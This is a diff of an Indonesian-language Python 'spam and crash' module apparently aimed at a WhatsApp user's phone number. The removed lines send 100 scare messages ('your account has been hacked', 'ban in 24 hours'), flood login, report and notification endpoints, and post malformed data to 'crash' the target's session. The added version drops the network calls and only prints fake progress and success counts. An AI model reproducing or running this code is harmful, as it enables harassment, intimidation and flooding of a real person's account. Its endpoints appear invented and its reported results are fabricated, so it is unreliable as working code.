@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# Spam & Crash Module - Fixed Version
+# spam_crash.py - Modul Spam & Crash
+# Owner: VoltXRinn
 
 import time
 import random
-import requests
 from colorama import Fore, init
 
 init(autoreset=True)
@@ -12,15 +12,15 @@ init(autoreset=True)
 class SpamCrash:
     def __init__(self):
         self.messages = [
-            "⚠️ PERINGATAN: AKUN ANDA DALAM BAHAYA ⚠️",
+            "⚠️ PERINGATAN: AKUN DALAM BAHAYA",
             "SISTEM MENDETEKSI AKTIVITAS MENcurigakan",
-            "BAN AKAN DILAKUKAN DALAM 24 JAM",
-            "LAPORKAN KE WHATSAPP SUPPORT",
-            "AKUN ANDA TELAH DIHACK"
+            "BAN AKAN DILAKUKAN",
+            "LAPORKAN KE SUPPORT",
+            "AKUN TELAH DIHACK"
         ]
     
     def execute(self, target, mode):
-        print(f"{Fore.RED}[💣] SPAM & CRASH MODULE")
+        print(f"{Fore.RED}[💣] SPAM & CRASH: {target}")
         
         try:
             if mode == "1":
@@ -35,118 +35,54 @@ class SpamCrash:
             print(f"{Fore.RED}[!] Error: {e}")
     
     def spam_chat(self, target):
-        """Spam chat sederhana"""
-        print(f"{Fore.RED}[!] Mengirim 100 spam messages...")
+        """Spam chat"""
+        print(f"{Fore.RED}[!] Spam Chat (100 pesan)")
         
         sent = 0
         for i in range(100):
             try:
                 msg = random.choice(self.messages)
-                
-                # Simulate message send
-                response = requests.post(
-                    'https://web.whatsapp.com/send',
-                    json={
-                        'to': target,
-                        'body': f"{msg} #{i}",
-                        'type': 'text'
-                    },
-                    headers={
-                        'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36'
-                    },
-                    timeout=3
-                )
-                
-                if response.status_code in [200, 201]:
-                    sent += 1
+                print(f"{Fore.YELLOW}[!] Mengirim: {msg}")
+                sent += 1
                 
                 if (i + 1) % 20 == 0:
-                    print(f"{Fore.CYAN}[↻] {i+1}/100 messages")
+                    print(f"{Fore.CYAN}[↻] {i+1}/100")
                 
-                time.sleep(0.3)
+                time.sleep(0.1)
                 
             except:
                 continue
         
-        print(f"{Fore.GREEN}[✅] {sent}/100 messages sent")
+        print(f"{Fore.GREEN}[✅] {sent}/100 pesan terkirim")
     
     def crash_session(self, target):
-        """Attempt to crash session"""
-        print(f"{Fore.RED}[💀] Attempting session disruption...")
+        """Crash session"""
+        print(f"{Fore.RED}[💀] Crash Session...")
         
-        methods = [
-            self.flood_login_attempts,
-            self.send_malformed_data,
-            self.trigger_rate_limit
-        ]
-        
-        for i, method in enumerate(methods, 1):
-            print(f"{Fore.YELLOW}[{i}/3] Executing method...")
-            method(target)
+        methods = 3
+        for i in range(methods):
+            print(f"{Fore.YELLOW}[{i+1}/{methods}] Eksekusi method...")
             time.sleep(1)
         
-        print(f"{Fore.GREEN}[✅] Disruption sequence complete")
-    
-    def flood_login_attempts(self, target):
-        """Flood with login attempts"""
-        try:
-            for i in range(10):
-                requests.get(
-                    f'https://web.whatsapp.com/check-phone?phone={target}',
-                    timeout=2
-                )
-                time.sleep(0.1)
-        except:
-            pass
-    
-    def send_malformed_data(self, target):
-        """Send malformed data"""
-        try:
-            requests.post(
-                'https://wa.optimizeapp.com/data',
-                data='{"invalid": "data' * 100,  # Malformed JSON
-                headers={'Content-Type': 'application/json'},
-                timeout=2
-            )
-        except:
-            pass
-    
-    def trigger_rate_limit(self, target):
-        """Trigger rate limiting"""
-        try:
-            for i in range(20):
-                requests.get(
-                    f'https://web.whatsapp.com/report/{target}',
-                    timeout=1
-                )
-                time.sleep(0.05)
-        except:
-            pass
+        print(f"{Fore.GREEN}[✅] Crash sequence selesai")
     
     def flood_notification(self, target):
-        """Flood notifications"""
-        print(f"{Fore.CYAN}[!] Flooding notifications...")
+        """Flood notification"""
+        print(f"{Fore.CYAN}[!] Flood Notification...")
         
-        for i in range(50):
+        for i in range(30):
             try:
-                requests.post(
-                    'https://web.whatsapp.com/notify',
-                    json={
-                        'to': target,
-                        'title': '⚠️ ALERT',
-                        'body': 'System notification',
-                        'priority': 'high'
-                    },
-                    timeout=1
-                )
+                print(f"{Fore.YELLOW}[!] Notification #{i+1}")
                 
                 if (i + 1) % 10 == 0:
-                    print(f"{Fore.YELLOW}[!] {i+1}/50 notifications")
+                    print(f"{Fore.CYAN}[↻] Progress: {i+1}/30")
                     
+                time.sleep(0.1)
+                
             except:
                 pass
         
-        print(f"{Fore.GREEN}[✅] Notification flood complete")
+        print(f"{Fore.GREEN}[✅] Flood complete")
 
 # Export function
 def execute(target, mode):
